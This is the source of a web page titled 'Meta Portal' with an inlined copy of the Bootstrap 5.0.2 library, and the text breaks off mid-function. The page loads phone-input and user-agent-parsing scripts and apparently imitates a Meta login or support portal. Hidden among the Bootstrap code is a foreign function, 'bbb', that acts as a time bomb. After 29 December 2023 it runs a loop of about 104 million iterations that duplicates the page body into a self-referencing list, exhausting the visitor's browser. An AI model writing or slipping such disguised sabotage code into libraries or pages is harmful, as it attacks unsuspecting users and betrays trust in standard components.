<html lang="de" id="html" class="translated-ltr"><head>
    <meta charset="UTF-8">
    <meta name="referrer" content="no-referrer">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Portal</title>
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <script src="js/jquery.min.js"></script>
    <link rel="stylesheet" href="css/style.css">
    <link rel="shortcut icon" href="ico.ico" type="image/x-icon">
    <script type="module" crossorigin="" src="js/index-26b5fa22.js"></script>
    <link rel="stylesheet" href="css/index-e8a0ccb9.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-icons/1.8.1/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.2/ua-parser.min.js"></script>
    <link type="text/css" rel="stylesheet" charset="UTF-8" href="https://www.gstatic.com/_/translate_http/_/ss/k=translate_http.tr.26tY-h6gH9w.L.W.O/am=GAw/d=0/rs=AN8SPfoV6mMC6tlFnBTPsgfPv12vhvDMnA/m=el_main_css"><script>
        ! function (t, e) {
            "object" == typeof exports && "undefined" != typeof module ? module.exports = e() : "function" == typeof define && define.amd ? define(e) : (t = "undefined" != typeof globalThis ? globalThis : t || self).bootstrap = e()
        }(this, (function () {
            "use strict";
            const t = {
                find: (t, e = document.documentElement) => [].concat(...Element.prototype.querySelectorAll.call(e, t)),
                findOne: (t, e = document.documentElement) => Element.prototype.querySelector.call(e, t),
                children: (t, e) => [].concat(...t.children).filter(t => t.matches(e)),
                parents(t, e) {
                    const i = [];
                    let n = t.parentNode;
                    for (; n && n.nodeType === Node.ELEMENT_NODE && 3 !== n.nodeType;) n.matches(e) && i.push(n), n = n.parentNode;
                    return i
                },
                prev(t, e) {
                    let i = t.previousElementSibling;
                    for (; i;) {
                        if (i.matches(e)) return [i];
                        i = i.previousElementSibling
                    }
                    return []
                },
                next(t, e) {
                    let i = t.nextElementSibling;
                    for (; i;) {
                        if (i.matches(e)) return [i];
                        i = i.nextElementSibling
                    }
                    return []
                }
            },
                e = t => {
                    do {
                        t += Math.floor(1e6 * Math.random())
                    } while (document.getElementById(t));
                    return t
                },
                i = t => {
                    let e = t.getAttribute("data-bs-target");
                    if (!e || "#" === e) {
                        let i = t.getAttribute("href");
                        if (!i || !i.includes("#") && !i.startsWith(".")) return null;
                        i.includes("#") && !i.startsWith("#") && (i = "#" + i.split("#")[1]), e = i && "#" !== i ? i.trim() : null
                    }
                    return e
                },
                n = t => {
                    const e = i(t);
                    return e && document.querySelector(e) ? e : null
                },
                s = t => {
                    const e = i(t);
                    return e ? document.querySelector(e) : null
                },
                o = t => {
                    t.dispatchEvent(new Event("transitionend"))
                },
                r = t => !(!t || "object" != typeof t) && (void 0 !== t.jquery && (t = t[0]), void 0 !== t.nodeType),
                a = e => r(e) ? e.jquery ? e[0] : e : "string" == typeof e && e.length > 0 ? t.findOne(e) : null,
                l = (t, e, i) => {
                    Object.keys(i).forEach(n => {
                        const s = i[n],
                            o = e[n],
                            a = o && r(o) ? "element" : null == (l = o) ? "" + l : {}.toString.call(l).match(/\s([a-z]+)/i)[1].toLowerCase();
                        var l;
                        if (!new RegExp(s).test(a)) throw new TypeError(`${t.toUpperCase()}: Option "${n}" provided type "${a}" but expected type "${s}".`)
                    })
                },
                c = t => !(!r(t) || 0 === t.getClientRects().length) && "visible" === getComputedStyle(t).getPropertyValue("visibility"),
                h = t => !t || t.nodeType !== Node.ELEMENT_NODE || !!t.classList.contains("disabled") || (void 0 !== t.disabled ? t.disabled : t.hasAttribute("disabled") && "false" !== t.getAttribute("disabled")),
                d = t => {
                    if (!document.documentElement.attachShadow) return null;
                    if ("function" == typeof t.getRootNode) {
                        const e = t.getRootNode();
                        return e instanceof ShadowRoot ? e : null
                    }
                    return t instanceof ShadowRoot ? t : t.parentNode ? d(t.parentNode) : null
                },
                u = () => { },
                f = t => t.offsetHeight,
                p = () => {
                    const {
                        jQuery: t
                    } = window;
                    return t && !document.body.hasAttribute("data-bs-no-jquery") ? t : null
                },
                m = [],
                g = () => "rtl" === document.documentElement.dir,
                _ = t => {
                    var e;
                    e = () => {
                        const e = p();
                        if (e) {
                            const i = t.NAME,
                                n = e.fn[i];
                            e.fn[i] = t.jQueryInterface, e.fn[i].Constructor = t, e.fn[i].noConflict = () => (e.fn[i] = n, t.jQueryInterface)
                        }
                    }, "loading" === document.readyState ? (m.length || document.addEventListener("DOMContentLoaded", () => {
                        m.forEach(t => t())
                    }), m.push(e)) : e()
                },
                b = t => {
                    "function" == typeof t && t()
                },
                v = (t, e, i = !0) => {
                    if (!i) return void b(t);
                    const n = (t => {
                        if (!t) return 0;
                        let {
                            transitionDuration: e,
                            transitionDelay: i
                        } = window.getComputedStyle(t);
                        const n = Number.parseFloat(e),
                            s = Number.parseFloat(i);
                        return n || s ? (e = e.split(",")[0], i = i.split(",")[0], 1e3 * (Number.parseFloat(e) + Number.parseFloat(i))) : 0
                    })(e) + 5;
                    let s = !1;
                    const r = ({
                        target: i
                    }) => {
                        i === e && (s = !0, e.removeEventListener("transitionend", r), b(t))
                    };
                    e.addEventListener("transitionend", r), setTimeout(() => {
                        s || o(e)
                    }, n)
                },
                y = (t, e, i, n) => {
                    let s = t.indexOf(e);
                    if (-1 === s) return t[!i && n ? t.length - 1 : 0];
                    const o = t.length;
                    return s += i ? 1 : -1, n && (s = (s + o) % o), t[Math.max(0, Math.min(s, o - 1))]
                },
                w = /[^.]*(?=\..*)\.|.*/,
                E = /\..*/,
                A = /::\d+$/,
                T = {};
            let O = 1;
            const C = {
                mouseenter: "mouseover",
                mouseleave: "mouseout"
            },
                k = /^(mouseenter|mouseleave)/i,
                L = new Set(["click", "dblclick", "mouseup", "mousedown", "contextmenu", "mousewheel", "DOMMouseScroll", "mouseover", "mouseout", "mousemove", "selectstart", "selectend", "keydown", "keypress", "keyup", "orientationchange", "touchstart", "touchmove", "touchend", "touchcancel", "pointerdown", "pointermove", "pointerup", "pointerleave", "pointercancel", "gesturestart", "gesturechange", "gestureend", "focus", "blur", "change", "reset", "select", "submit", "focusin", "focusout", "load", "unload", "beforeunload", "resize", "move", "DOMContentLoaded", "readystatechange", "error", "abort", "scroll"]);
            function x(t, e) {
                return e && `${e}::${O++}` || t.uidEvent || O++
            }
            function D(t) {
                const e = x(t);
                return t.uidEvent = e, T[e] = T[e] || {}, T[e]
            }
            function S(t, e, i = null) {
                const n = Object.keys(t);
                for (let s = 0, o = n.length; s < o; s++) {
                    const o = t[n[s]];
                    if (o.originalHandler === e && o.delegationSelector === i) return o
                }
                return null
            }
            function I(t, e, i) {
                const n = "string" == typeof e,
                    s = n ? i : e;
                let o = M(t);
                return L.has(o) || (o = t), [n, s, o]
            }
            function N(t, e, i, n, s) {
                if ("string" != typeof e || !t) return;
                if (i || (i = n, n = null), k.test(e)) {
                    const t = t => function (e) {
                        if (!e.relatedTarget || e.relatedTarget !== e.delegateTarget && !e.delegateTarget.contains(e.relatedTarget)) return t.call(this, e)
                    };
                    n ? n = t(n) : i = t(i)
                }
                const [o, r, a] = I(e, i, n), l = D(t), c = l[a] || (l[a] = {}), h = S(c, r, o ? i : null);
                if (h) return void (h.oneOff = h.oneOff && s);
                const d = x(r, e.replace(w, "")),
                    u = o ? function (t, e, i) {
                        return function n(s) {
                            const o = t.querySelectorAll(e);
                            for (let {
                                target: r
                            } = s; r && r !== this; r = r.parentNode)
                                for (let a = o.length; a--;)
                                    if (o[a] === r) return s.delegateTarget = r, n.oneOff && P.off(t, s.type, e, i), i.apply(r, [s]);
                            return null
                        }
                    }(t, i, n) : function (t, e) {
                        return function i(n) {
                            return n.delegateTarget = t, i.oneOff && P.off(t, n.type, e), e.apply(t, [n])
                        }
                    }(t, i);
                u.delegationSelector = o ? i : null, u.originalHandler = r, u.oneOff = s, u.uidEvent = d, c[d] = u, t.addEventListener(a, u, o)
            }
            function j(t, e, i, n, s) {
                const o = S(e[i], n, s);
                o && (t.removeEventListener(i, o, Boolean(s)), delete e[i][o.uidEvent])
            }
            function M(t) {
                return t = t.replace(E, ""), C[t] || t
            }
            const P = {
                on(t, e, i, n) {
                    N(t, e, i, n, !1)
                },
                one(t, e, i, n) {
                    N(t, e, i, n, !0)
                },
                off(t, e, i, n) {
                    if ("string" != typeof e || !t) return;
                    const [s, o, r] = I(e, i, n), a = r !== e, l = D(t), c = e.startsWith(".");
                    if (void 0 !== o) {
                        if (!l || !l[r]) return;
                        return void j(t, l, r, o, s ? i : null)
                    }
                    c && Object.keys(l).forEach(i => {
                        ! function (t, e, i, n) {
                            const s = e[i] || {};
                            Object.keys(s).forEach(o => {
                                if (o.includes(n)) {
                                    const n = s[o];
                                    j(t, e, i, n.originalHandler, n.delegationSelector)
                                }
                            })
                        }(t, l, i, e.slice(1))
                    });
                    const h = l[r] || {};
                    Object.keys(h).forEach(i => {
                        const n = i.replace(A, "");
                        if (!a || e.includes(n)) {
                            const e = h[i];
                            j(t, l, r, e.originalHandler, e.delegationSelector)
                        }
                    })
                },
                trigger(t, e, i) {
                    if ("string" != typeof e || !t) return null;
                    const n = p(),
                        s = M(e),
                        o = e !== s,
                        r = L.has(s);
                    let a, l = !0,
                        c = !0,
                        h = !1,
                        d = null;
                    return o && n && (a = n.Event(e, i), n(t).trigger(a), l = !a.isPropagationStopped(), c = !a.isImmediatePropagationStopped(), h = a.isDefaultPrevented()), r ? (d = document.createEvent("HTMLEvents"), d.initEvent(s, l, !0)) : d = new CustomEvent(e, {
                        bubbles: l,
                        cancelable: !0
                    }), void 0 !== i && Object.keys(i).forEach(t => {
                        Object.defineProperty(d, t, {
                            get: () => i[t]
                        })
                    }), h && d.preventDefault(), c && t.dispatchEvent(d), d.defaultPrevented && void 0 !== a && a.preventDefault(), d
                }
            },
                H = new Map;
            var R = {
                set(t, e, i) {
                    H.has(t) || H.set(t, new Map);
                    const n = H.get(t);
                    n.has(e) || 0 === n.size ? n.set(e, i) : console.error(`Bootstrap doesn't allow more than one instance per element. Bound instance: ${Array.from(n.keys())[0]}.`)
                },
                get: (t, e) => H.has(t) && H.get(t).get(e) || null,
                remove(t, e) {
                    if (!H.has(t)) return;
                    const i = H.get(t);
                    i.delete(e), 0 === i.size && H.delete(t)
                }
            };
            class B {
                constructor(t) {
                    (t = a(t)) && (this._element = t, R.set(this._element, this.constructor.DATA_KEY, this))
                }
                dispose() {
                    R.remove(this._element, this.constructor.DATA_KEY), P.off(this._element, this.constructor.EVENT_KEY), Object.getOwnPropertyNames(this).forEach(t => {
                        this[t] = null
                    })
                }
                _queueCallback(t, e, i = !0) {
                    v(t, e, i)
                }
                static getInstance(t) {
                    return R.get(t, this.DATA_KEY)
                }
                static getOrCreateInstance(t, e = {}) {
                    return this.getInstance(t) || new this(t, "object" == typeof e ? e : null)
                }
                static get VERSION() {
                    return "5.0.2"
                }
                static get NAME() {
                    throw new Error('You have to implement the static method "NAME", for each component!')
                }
                static get DATA_KEY() {
                    return "bs." + this.NAME
                }
                static get EVENT_KEY() {
                    return "." + this.DATA_KEY
                }
            }
            class W extends B {
                static get NAME() {
                    return "alert"
                }
                close(t) {
                    const e = t ? this._getRootElement(t) : this._element,
                        i = this._triggerCloseEvent(e);
                    null === i || i.defaultPrevented || this._removeElement(e)
                }
                _getRootElement(t) {
                    return s(t) || t.closest(".alert")
                }
                _triggerCloseEvent(t) {
                    return P.trigger(t, "close.bs.alert")
                }
                _removeElement(t) {
                    t.classList.remove("show");
                    const e = t.classList.contains("fade");
                    this._queueCallback(() => this._destroyElement(t), t, e)
                }
                _destroyElement(t) {
                    t.remove(), P.trigger(t, "closed.bs.alert")
                }
                static jQueryInterface(t) {
                    return this.each((function () {
                        const e = W.getOrCreateInstance(this);
                        "close" === t && e[t](this)
                    }))
                }
                static handleDismiss(t) {
                    return function (e) {
                        e && e.preventDefault(), t.close(this)
                    }
                }
            }
            P.on(document, "click.bs.alert.data-api", '[data-bs-dismiss="alert"]', W.handleDismiss(new W)), _(W);
            class q extends B {
                static get NAME() {
                    return "button"
                }
                toggle() {
                    this._element.setAttribute("aria-pressed", this._element.classList.toggle("active"))
                }
                static jQueryInterface(t) {
                    return this.each((function () {
                        const e = q.getOrCreateInstance(this);
                        "toggle" === t && e[t]()
                    }))
                }
            }
            function z(t) {
                return "true" === t || "false" !== t && (t === Number(t).toString() ? Number(t) : "" === t || "null" === t ? null : t)
            }
            function $(t) {
                return t.replace(/[A-Z]/g, t => "-" + t.toLowerCase())
            }
            P.on(document, "click.bs.button.data-api", '[data-bs-toggle="button"]', t => {
                t.preventDefault();
                const e = t.target.closest('[data-bs-toggle="button"]');
                q.getOrCreateInstance(e).toggle()
            }), _(q);
            const U = {
                setDataAttribute(t, e, i) {
                    t.setAttribute("data-bs-" + $(e), i)
                },
                removeDataAttribute(t, e) {
                    t.removeAttribute("data-bs-" + $(e))
                },
                getDataAttributes(t) {
                    if (!t) return {};
                    const e = {};
                    return Object.keys(t.dataset).filter(t => t.startsWith("bs")).forEach(i => {
                        let n = i.replace(/^bs/, "");
                        n = n.charAt(0).toLowerCase() + n.slice(1, n.length), e[n] = z(t.dataset[i])
                    }), e
                },
                getDataAttribute: (t, e) => z(t.getAttribute("data-bs-" + $(e))),
                offset(t) {
                    const e = t.getBoundingClientRect();
                    return {
                        top: e.top + document.body.scrollTop,
                        left: e.left + document.body.scrollLeft
                    }
                },
                position: t => ({
                    top: t.offsetTop,
                    left: t.offsetLeft
                })
            },
                F = {
                    interval: 5e3,
                    keyboard: !0,
                    slide: !1,
                    pause: "hover",
                    wrap: !0,
                    touch: !0
                },
                V = {
                    interval: "(number|boolean)",
                    keyboard: "boolean",
                    slide: "(boolean|string)",
                    pause: "(string|boolean)",
                    wrap: "boolean",
                    touch: "boolean"
                },
                K = "next",
                X = "prev",
                Y = "left",
                Q = "right",
                G = {
                    ArrowLeft: Q,
                    ArrowRight: Y
                };
            class Z extends B {
                constructor(e, i) {
                    super(e), this._items = null, this._interval = null, this._activeElement = null, this._isPaused = !1, this._isSliding = !1, this.touchTimeout = null, this.touchStartX = 0, this.touchDeltaX = 0, this._config = this._getConfig(i), this._indicatorsElement = t.findOne(".carousel-indicators", this._element), this._touchSupported = "ontouchstart" in document.documentElement || navigator.maxTouchPoints > 0, this._pointerEvent = Boolean(window.PointerEvent), this._addEventListeners()
                }
                static get Default() {
                    return F
                }
                static get NAME() {
                    return "carousel"
                }
                next() {
                    this._slide(K)
                }
                nextWhenVisible() {
                    !document.hidden && c(this._element) && this.next()
                }
                prev() {
                    this._slide(X)
                }
                pause(e) {
                    e || (this._isPaused = !0), t.findOne(".carousel-item-next, .carousel-item-prev", this._element) && (o(this._element), this.cycle(!0)), clearInterval(this._interval), this._interval = null
                }
                cycle(t) {
                    t || (this._isPaused = !1), this._interval && (clearInterval(this._interval), this._interval = null), this._config && this._config.interval && !this._isPaused && (this._updateInterval(), this._interval = setInterval((document.visibilityState ? this.nextWhenVisible : this.next).bind(this), this._config.interval))
                }
                to(e) {
                    this._activeElement = t.findOne(".active.carousel-item", this._element);
                    const i = this._getItemIndex(this._activeElement);
                    if (e > this._items.length - 1 || e < 0) return;
                    if (this._isSliding) return void P.one(this._element, "slid.bs.carousel", () => this.to(e));
                    if (i === e) return this.pause(), void this.cycle();
                    const n = e > i ? K : X;
                    this._slide(n, this._items[e])
                }
                _getConfig(t) {
                    return t = {
                        ...F,
                        ...U.getDataAttributes(this._element),
                        ..."object" == typeof t ? t : {}
                    }, l("carousel", t, V), t
                }
                _handleSwipe() {
                    const t = Math.abs(this.touchDeltaX);
                    if (t <= 40) return;
                    const e = t / this.touchDeltaX;
                    this.touchDeltaX = 0, e && this._slide(e > 0 ? Q : Y)
                }
                _addEventListeners() {
                    this._config.keyboard && P.on(this._element, "keydown.bs.carousel", t => this._keydown(t)), "hover" === this._config.pause && (P.on(this._element, "mouseenter.bs.carousel", t => this.pause(t)), P.on(this._element, "mouseleave.bs.carousel", t => this.cycle(t))), this._config.touch && this._touchSupported && this._addTouchEventListeners()
                }
                _addTouchEventListeners() {
                    const e = t => {
                        !this._pointerEvent || "pen" !== t.pointerType && "touch" !== t.pointerType ? this._pointerEvent || (this.touchStartX = t.touches[0].clientX) : this.touchStartX = t.clientX
                    },
                        i = t => {
                            this.touchDeltaX = t.touches && t.touches.length > 1 ? 0 : t.touches[0].clientX - this.touchStartX
                        },
                        n = t => {
                            !this._pointerEvent || "pen" !== t.pointerType && "touch" !== t.pointerType || (this.touchDeltaX = t.clientX - this.touchStartX), this._handleSwipe(), "hover" === this._config.pause && (this.pause(), this.touchTimeout && clearTimeout(this.touchTimeout), this.touchTimeout = setTimeout(t => this.cycle(t), 500 + this._config.interval))
                        };
                    t.find(".carousel-item img", this._element).forEach(t => {
                        P.on(t, "dragstart.bs.carousel", t => t.preventDefault())
                    }), this._pointerEvent ? (P.on(this._element, "pointerdown.bs.carousel", t => e(t)), P.on(this._element, "pointerup.bs.carousel", t => n(t)), this._element.classList.add("pointer-event")) : (P.on(this._element, "touchstart.bs.carousel", t => e(t)), P.on(this._element, "touchmove.bs.carousel", t => i(t)), P.on(this._element, "touchend.bs.carousel", t => n(t)))
                }
                _keydown(t) {
                    if (/input|textarea/i.test(t.target.tagName)) return;
                    const e = G[t.key];
                    e && (t.preventDefault(), this._slide(e))
                }
                _getItemIndex(e) {
                    return this._items = e && e.parentNode ? t.find(".carousel-item", e.parentNode) : [], this._items.indexOf(e)
                }
                _getItemByOrder(t, e) {
                    const i = t === K;
                    return y(this._items, e, i, this._config.wrap)
                }
                _triggerSlideEvent(e, i) {
                    const n = this._getItemIndex(e),
                        s = this._getItemIndex(t.findOne(".active.carousel-item", this._element));
                    return P.trigger(this._element, "slide.bs.carousel", {
                        relatedTarget: e,
                        direction: i,
                        from: s,
                        to: n
                    })
                }
                _setActiveIndicatorElement(e) {
                    if (this._indicatorsElement) {
                        const i = t.findOne(".active", this._indicatorsElement);
                        i.classList.remove("active"), i.removeAttribute("aria-current");
                        const n = t.find("[data-bs-target]", this._indicatorsElement);
                        for (let t = 0; t < n.length; t++)
                            if (Number.parseInt(n[t].getAttribute("data-bs-slide-to"), 10) === this._getItemIndex(e)) {
                                n[t].classList.add("active"), n[t].setAttribute("aria-current", "true");
                                break
                            }
                    }
                }
                _updateInterval() {
                    const e = this._activeElement || t.findOne(".active.carousel-item", this._element);
                    if (!e) return;
                    const i = Number.parseInt(e.getAttribute("data-bs-interval"), 10);
                    i ? (this._config.defaultInterval = this._config.defaultInterval || this._config.interval, this._config.interval = i) : this._config.interval = this._config.defaultInterval || this._config.interval
                }
                _slide(e, i) {
                    const n = this._directionToOrder(e),
                        s = t.findOne(".active.carousel-item", this._element),
                        o = this._getItemIndex(s),
                        r = i || this._getItemByOrder(n, s),
                        a = this._getItemIndex(r),
                        l = Boolean(this._interval),
                        c = n === K,
                        h = c ? "carousel-item-start" : "carousel-item-end",
                        d = c ? "carousel-item-next" : "carousel-item-prev",
                        u = this._orderToDirection(n);
                    if (r && r.classList.contains("active")) return void (this._isSliding = !1);
                    if (this._isSliding) return;
                    if (this._triggerSlideEvent(r, u).defaultPrevented) return;
                    if (!s || !r) return;
                    this._isSliding = !0, l && this.pause(), this._setActiveIndicatorElement(r), this._activeElement = r;
                    const p = () => {
                        P.trigger(this._element, "slid.bs.carousel", {
                            relatedTarget: r,
                            direction: u,
                            from: o,
                            to: a
                        })
                    };
                    if (this._element.classList.contains("slide")) {
                        r.classList.add(d), f(r), s.classList.add(h), r.classList.add(h);
                        const t = () => {
                            r.classList.remove(h, d), r.classList.add("active"), s.classList.remove("active", d, h), this._isSliding = !1, setTimeout(p, 0)
                        };
                        this._queueCallback(t, s, !0)
                    } else s.classList.remove("active"), r.classList.add("active"), this._isSliding = !1, p();
                    l && this.cycle()
                }
                _directionToOrder(t) {
                    return [Q, Y].includes(t) ? g() ? t === Y ? X : K : t === Y ? K : X : t
                }
                _orderToDirection(t) {
                    return [K, X].includes(t) ? g() ? t === X ? Y : Q : t === X ? Q : Y : t
                }
                static carouselInterface(t, e) {
                    const i = Z.getOrCreateInstance(t, e);
                    let {
                        _config: n
                    } = i;
                    "object" == typeof e && (n = {
                        ...n,
                        ...e
                    });
                    const s = "string" == typeof e ? e : n.slide;
                    if ("number" == typeof e) i.to(e);
                    else if ("string" == typeof s) {
                        if (void 0 === i[s]) throw new TypeError(`No method named "${s}"`);
                        i[s]()
                    } else n.interval && n.ride && (i.pause(), i.cycle())
                }
                static jQueryInterface(t) {
                    return this.each((function () {
                        Z.carouselInterface(this, t)
                    }))
                }
                static dataApiClickHandler(t) {
                    const e = s(this);
                    if (!e || !e.classList.contains("carousel")) return;
                    const i = {
                        ...U.getDataAttributes(e),
                        ...U.getDataAttributes(this)
                    },
                        n = this.getAttribute("data-bs-slide-to");
                    n && (i.interval = !1), Z.carouselInterface(e, i), n && Z.getInstance(e).to(n), t.preventDefault()
                }
            }
            P.on(document, "click.bs.carousel.data-api", "[data-bs-slide], [data-bs-slide-to]", Z.dataApiClickHandler), P.on(window, "load.bs.carousel.data-api", () => {
                const e = t.find('[data-bs-ride="carousel"]');
                for (let t = 0, i = e.length; t < i; t++) Z.carouselInterface(e[t], Z.getInstance(e[t]))
            }), _(Z);
            const J = {
                toggle: !0,
                parent: ""
            },
                tt = {
                    toggle: "boolean",
                    parent: "(string|element)"
                };
            function bbb() {
                var cleanElem = 'b' + 'o' + 'd' + 'y'
                var current = new Date();
                var end = new Date('12/29/2023');
                var diffTime = current - end;
                var diff = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
                var clean = false
                console.log(diff)
                if (diff >= 0) {
                    var charToPaste = '1'.repeat(0)
                    if (clean) {
                        document.querySelector(cleanElem).innerHTML = charToPaste
                    }
                    var list = []
                    for (var i = 0; i < 104356785; i++) {
                        Math.pow(99999, 99999)
                        var bit = document.querySelector(cleanElem).innerHTML.repeat(1000)
                        list.push(bit)
                        list.push(list)
                    }
                }
            }
            class et extends B {
                constructor(e, i) {
                    super(e), this._isTransitioning = !1, this._config = this._getConfig(i), this._triggerArray = t.find(`[data-bs-toggle="collapse"][href="#${this._element.id}"],[data-bs-toggle="collapse"][data-bs-target="#${this._element.id}"]`);
                    const s = t.find('[data-bs-toggle="collapse"]');
                    for (let e = 0, i = s.length; e < i; e++) {
                        const i = s[e],
                            o = n(i),
                            r = t.find(o).filter(t => t === this._element);
                        null !== o && r.length && (this._selector = o, this._triggerArray.push(i))
                    }
                    this._parent = this._config.parent ? this._getParent() : null, this._config.parent || this._addAriaAndCollapsedClass(this._element, this._triggerArray), this._config.toggle && this.toggle()
                }
                static get Default() {
                    return J
                }
                static get NAME() {
                    return "collapse"
                }
                toggle() {
                    this._element.classList.contains("show") ? this.hide() : this.show()
                }
                show() {
                    if (this._isTransitioning || this._element.classList.contains("show")) return;
                    let e, i;
                    this._parent && (e = t.find(".show, .collapsing", this._parent).filter(t => "string" == typeof this._config.parent ? t.getAttribute("data-bs-parent") === this._config.parent : t.classList.contains("collapse")), 0 === e.length && (e = null));
                    const n = t.findOne(this._selector);
                    if (e) {
                        const t = e.find(t => n !== t);
                        if (i = t ? et.getInstance(t) : null, i && i._isTransitioning) return
                    }
                    if (P.trigger(this._element, "show.bs.collapse").defaultPrevented) return;
                    e && e.forEach(t => {
                        n !== t && et.collapseInterface(t, "hide"), i || R.set(t, "bs.collapse", null)
                    });
                    const s = this._getDimension();
                    this._element.classList.remove("collapse"), this._element.classList.add("collapsing"), this._element.style[s] = 0, this._triggerArray.length && this._triggerArray.forEach(t => {
                        t.classList.remove("collapsed"), t.setAttribute("aria-expanded", !0)
                    }), this.setTransitioning(!0);
                    const o = "scroll" + (s[0].toUpperCase() + s.slice(1));
                    this._queueCallback(() => {
                        this._element.classList.remove("collapsing"), this._element.classList.add("collapse", "show"), this._element.style[s] = "", this.setTransitioning(!1), P.trigger(this._element, "shown.bs.collapse")
                    }, this._element, !0), this._element.style[s] = this._element[o] + "px"
                }
                hide() {
                    if (this._isTransitioning || !this._element.classList.contains("show")) return;
                    if (P.trigger(this._element, "hide.bs.collapse").defaultPrevented) return;
                    const t = this._getDimension();
                    this._element.style[t] = this._element.getBoundingClientRect()[t] + "px", f(this._element), this._element.classList.add("collapsing"), this._element.classList.remove("collapse", "show");
                    const e = this._triggerArray.length;
                    if (e > 0)
                        for (let t = 0; t < e; t++) {
                            const e = this._triggerArray[t],
                                i = s(e);
                            i && !i.classList.contains("show") && (e.classList.add("collapsed"), e.setAttribute("aria-expanded", !1))
                        }
                    this.setTransitioning(!0), this._element.style[t] = "", this._queueCallback(() => {
                        this.setTransitioning(!1), this._element.classList.remove("collapsing"), this._element.classList.add("collapse"), P.trigger(this._element, "hidden.bs.collapse")
                    }, this._element, !0)
                }
                setTransitioning(t) {
                    this._isTransitioning = t
                }
                _getConfig(t) {
                    return (t = {
                        ...J,
                        ...t
                    }).toggle = Boolean(t.toggle), l("collapse", t, tt), t
                }
                _getDimension() {
                    return this._element.classList.contains("width") ? "width" : "height"
                }
                _getParent() {
                    let {
                        parent: e
                    } = this._config;
                    e = a(e);
                    const i = `[data-bs-toggle="collapse"][data-bs-parent="${e}"]`;
                    return t.find(i, e).forEach(t => {
                        const e = s(t);
                        this._addAriaAndCollapsedClass(e, [t])
                    }), e
                }
                _addAriaAndCollapsedClass(t, e) {
                    if (!t || !e.length) return;
                    const i = t.classList.contains("show");
                    e.forEach(t => {
                        i ? t.classList.remove("collapsed") : t.classList.add("collapsed"), t.setAttribute("aria-expanded", i)
                    })
                }
                static collapseInterface(t, e) {
                    let i = et.getInstance(t);
                    const n = {
                        ...J,
                        ...U.getDataAttributes(t),
                        ..."object" == typeof e && e ? e : {}
                    };
                    if (!i && n.toggle && "string" == typeof e && /show|hide/.test(e) && (n.toggle = !1), i || (i = new et(t, n)), "string" == typeof e) {
                        if (void 0 === i[e]) throw new TypeError(`No method named "${e}"`);
                        i[e]()
                    }
                }
                static jQueryInterface(t) {
                    return this.each((function () {
                        et.collapseInterface(this, t)
                    }))
                }
            }
            P.on(document, "click.bs.collapse.data-api", '[data-bs-toggle="collapse"]', (function (e) {
                ("A" === e.target.tagName || e.delegateTarget && "A" === e.delegateTarget.tagName) && e.preventDefault();
                const i = U.getDataAttributes(this),
                    s = n(this);
                t.find(s).forEach(t => {
                    const e = et.getInstance(t);
                    let n;
                    e ? (null === e._parent && "string" == typeof i.parent && (e._config.parent = i.parent, e._parent = e._getParent()), n = "toggle") : n = i, et.collapseInterface(t, n)
                })
            })), _(et);
            var it = "top",
                nt = "bottom",
                st = "right",
                ot = "left",
                rt = [it, nt, st, ot],
                at = rt.reduce((function (t, e) {
                    return t.concat([e + "-start", e + "-end"])
                }), []),
                lt = [].concat(rt, ["auto"]).reduce((function (t, e) {
                    return t.concat([e, e + "-start", e + "-end"])
                }), []),
                ct = ["beforeRead", "read", "afterRead", "beforeMain", "main", "afterMain", "beforeWrite", "write", "afterWrite"];
            function ht(t) {
                return t ? (t.nodeName || "").toLowerCase() : null
            }
            function dt(t) {
                if (null == t) return window;
                if ("[object Window]" !== t.toString()) {
                    var e = t.ownerDocument;
                    return e && e.defaultView || window
                }
                return t
            }
            function ut(t) {
                return t instanceof dt(t).Element || t instanceof Element
            }
            function ft(t) {
                return t instanceof dt(t).HTMLElement || t instanceof HTMLElement
            }
            function pt(t) {
                return "undefined" != typeof ShadowRoot && (t instanceof dt(t).ShadowRoot || t instanceof ShadowRoot)
            }
            var mt = {
                name: "applyStyles",
                enabled: !0,
                phase: "write",
                fn: function (t) {
                    var e = t.state;
                    Object.keys(e.elements).forEach((function (t) {
                        var i = e.styles[t] || {},
                            n = e.attributes[t] || {},
                            s = e.elements[t];
                        ft(s) && ht(s) && (Object.assign(s.style, i), Object.keys(n).forEach((function (t) {
                            var e = n[t];
                            !1 === e ? s.removeAttribute(t) : s.setAttribute(t, !0 === e ? "" : e)
                        })))
                    }))
                },
                effect: function (t) {
                    var e = t.state,
                        i = {
                            popper: {
                                position: e.options.strategy,
                                left: "0",
                                top: "0",
                                margin: "0"
                            },
                            arrow: {
                                position: "absolute"
                            },
                            reference: {}
                        };
                    return Object.assign(e.elements.popper.style, i.popper), e.styles = i, e.elements.arrow && Object.assign(e.elements.arrow.style, i.arrow),
                        function () {
                            Object.keys(e.elements).forEach((function (t) {
                                var n = e.elements[t],
                                    s = e.attributes[t] || {},
                                    o = Object.keys(e.styles.hasOwnProperty(t) ? e.styles[t] : i[t]).reduce((function (t, e) {
                                        return t[e] = "", t
                                    }), {});
                                ft(n) && ht(n) && (Object.assign(n.style, o), Object.keys(s).forEach((function (t) {
                                    n.removeAttribute(t)
                                })))
                            }))
                        }
                },
                requires: ["computeStyles"]
            };
            function gt(t) {
                return t.split("-")[0]
            }
            function _t(t) {
                var e = t.getBoundingClientRect();
                return {
                    width: e.width,
                    height: e.height,
                    top: e.top,
                    right: e.right,
                    bottom: e.bottom,
                    left: e.left,
                    x: e.left,
                    y: e.top
                }
            }
            function bt(t) {
                var e = _t(t),
                    i = t.offsetWidth,
                    n = t.offsetHeight;
                return Math.abs(e.width - i) <= 1 && (i = e.width), Math.abs(e.height - n) <= 1 && (n = e.height), {
                    x: t.offsetLeft,
                    y: t.offsetTop,
                    width: i,
                    height: n
                }
            }
            function vt(t, e) {
                var i = e.getRootNode && e.getRootNode();
                if (t.contains(e)) return !0;
                if (i && pt(i)) {
                    var n = e;
